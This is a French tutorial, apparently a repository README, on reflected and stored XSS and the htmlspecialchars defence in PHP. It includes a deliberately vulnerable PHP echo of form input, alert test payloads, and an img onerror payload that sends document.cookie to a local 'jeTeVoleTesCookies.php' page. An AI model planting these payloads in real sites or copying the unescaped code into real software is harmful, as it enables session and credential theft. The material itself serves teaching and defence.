# Se protéger contre les Failles Web

## 1. Failles XXS (Cross-site scripting)

- `XSS (Cross-site scripting)`  est une faille permettant l'injection de code HTML ou JavaScript dans des variables mal protégées. Il existe en fait deux types de XSS :
Le XSS réfléchi (non permanent) : on dit qu’elle est non permanente car elle n’est pas enregistrée dans un fichier ou une base de données.

- `Le XSS stocké (permanent)` : c’est une faille plus sérieuse car le script est sauvegardé dans un fichier ou une base de données. Il sera donc affiché à chaque ouverture du site. 

### Le XSS réfléchi

L’exemple le plus courant est celui du formulaire. Voici un formulaire basic sans mot de passe : Créez un dossier nommé faille par exemple dans lequel vous allez créer un fichier index.html et un fichier connexion.php

Imaginez que nous ayons un simple fichier index.html avec un formulaire : 

```html

    <form method="post" action="connexion.php">
        <input type="texte" name="pseudo" />
        <input type="submit" value="Se connecter" />
    </form>

```

Et un fichier connexion.php qui récupère la valeur de l'input

```php
echo "Bonjour " . $_POST['pseudo'] . "!"
```

- testez ce code et voyez ce qu'il se passe : `<strong>Coucou</strong>`
- Et avec celui-ci ? : `<script>alert('Il y a une faille XSS')</script>`

Vous pouvez egalement tester cela sur ce site : https://www.google.com/about/appsecurity/learning/xss/ 

### Le XSS stocké (permanant)

C'est une faille plus sérieuse car le script est sauvegardé dans un fichier ou une base de données.

Beaucoup de sites stockent les pseudo/ password de leurs utilisateurs dans des cookies. 
Utilisée correctement, cette faille peut par exemple permettre au pirate de récupérer les valeurs de ces fameux cookies. 
Voilà comment il va procéder. Il va tout d'abord insérer un code frauduleux sur une page de votre site où il peut écrire (livre d'or par exemple) ! Il va ensuite vous envoyer un message et vous inviter à aller voir cette fameuse page. Vous, sans vous méfier, cliquez et là … hop vous êtes redirigé et le pirate a récupéré votre cookie, et donc vos identifiants d'administrateur du site.

On peut distinguer plusieurs possibilités non exhaustives d’exploitation de cette faille :

- Une redirection de la page afin de nuire aux utilisateurs ou pour tenter une attaque de phishing.
- Voler des sessions ou des cookies. (Donc se faire passer pour un autre utilisateur pour exécuter des actions)
- Rendre le site inaccessible en utilisant des alertes en boucle ou tout autre moyen nuisible.

### Exemple de ce que le méchant Hacker pourrait faire 

- testez sur le site : `<img src="petitChat.jpg" onerror="alert(document.cookie);">`

- Vous pouvez egalement le tester en localhost. Vous trouverez dans ce repository un dossier `failleHacker` qui contient un fichier `jeTeVoleTesCookies.php` . 
- Ajouter ce code dans index.html : `<img src="petitChat.jpg" onerror="window.location='../failleHacker/jeTeVoleTesCookies.php?cookie='+document.cookie;" hidden>` (Normalement le hacker mettrai cela dans l'input. Mais chrome se protège un minimum et bloque cette fonctionnalité. Raison pour laquelle nous allons mettre le code dans l'html )
- Décommentez les lignes suivantes pour voir ce que cela donne...

Voici juste un petit aperçu si je décommente `phpinfo();`

Voici va se passer. Ce script redirige l’utilisateur si il y a une erreur. Or l’image petitChat.jpg n’existe pas. Le pirate a bien calculé son coup, il voulait qu’il y ai une erreur.
Ainsi, onerror (en cas d’erreur) vous êtes alors redirigé vers la page jeTeVoleTesCookies.php et tout ça en communiquant le contenu de votre cookie dans l’URL. Sur la page jeTeVoleTesCookies.php, le pirate n'aura qu'à récupérer la variable cookie grâce à un GET et la stocker dans un fichier. À partir de ce moment-là il détient vos informations personnelles. Cela peut s'avérer très embêtant, surtout si vous êtes l'administrateur du site web.

## Comment s'en protéger ?

Il faut absolument utiliser les fonctions php `htmlspecialchars()` qui filtre les ‘<‘ et ‘>’ ou `htmlentities()` qui filtre toutes les entités html.

htmlspacialchars() . Cette fonction permet de filtrer les symboles du type  <, & ou encore ", en les remplaçant par leur équivalent en HTML. Par exemple :

- Le symbole & devient &amp;
- Le symbole " devient &quot;
- Le symbole ' devient &#39;

Modifions notre fichier connexion.php avec la protection

```php

  $pseudo = htmlspecialchars($_POST['pseudo'], ENT_QUOTES);
  echo "Bonjour ".$pseudo." !"

  ```

  `ENT_QUOTES` : converti les simples et doubles guillemets. `"MonNom"` deviendra `&quot;MonNom&quot;`



